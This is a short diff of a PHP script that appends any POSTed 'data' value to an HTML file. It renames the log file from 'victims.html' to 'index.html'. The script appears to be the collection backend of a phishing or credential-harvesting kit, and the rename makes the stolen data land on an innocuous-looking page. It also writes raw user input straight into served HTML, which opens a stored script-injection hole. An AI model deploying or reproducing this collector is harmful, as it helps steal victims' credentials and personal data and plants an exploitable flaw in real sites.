@@ -1,6 +1,6 @@
 <?php
 
- $filename="victims.html";
+ $filename="index.html";
 
  file_put_contents($filename,$_POST["data"]."<br/>",FILE_APPEND);
 
